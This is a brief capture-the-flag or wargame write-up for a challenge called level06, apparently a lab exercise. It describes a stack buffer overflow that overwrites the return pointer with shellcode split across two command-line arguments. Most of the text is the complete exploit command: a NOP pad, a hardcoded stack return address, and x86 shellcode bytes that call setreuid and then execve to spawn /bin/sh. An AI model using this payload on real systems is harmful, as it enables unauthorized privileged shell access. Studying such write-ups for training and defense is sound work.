Still pretty simple overwrite of return pointer, but with the slight complexity that it slices up our shellcode into 2 memory location. Blasting a nice memory pad into argv[1] and argv[2] makes it pretty clear where the stack return pointer is, plus how to construct the shellcode to slice it correctly. 

We have to be smart enough to divide it up on the command line:

./level06 `echo -e '\x90\x90\xcd\x80'``echo -e '\x18\xdc\xff\xbf'`x003x004x005x006x007x00 `echo -e '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1'`
